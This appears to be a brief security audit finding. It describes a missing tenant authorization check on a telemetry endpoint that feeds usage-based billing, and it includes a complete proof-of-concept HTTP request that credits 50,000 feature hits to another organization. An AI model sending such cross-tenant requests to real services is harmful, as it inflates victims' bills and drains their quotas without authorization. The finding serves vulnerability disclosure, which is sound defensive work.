diagnosis: The endpoint increments a Prometheus counter keyed by organization_id specified in the request body. Because this counter feeds automated consumption-based billing pipelines, the absence of an authorization check between body.organization_id and current_user.organization_id allows malicious tenants to artificially inflate competitors' usage metrics or deplete their quota limits.
exploit_request:
POST /telemetry/track-feature-hit HTTP/1.1
Host: telemetry.saas.io
Authorization: Bearer <attacker_token>
Content-Type: application/json

{"organization_id": "org_target_corp", "feature_name": "ai_inference_v2", "hit_count": 50000}
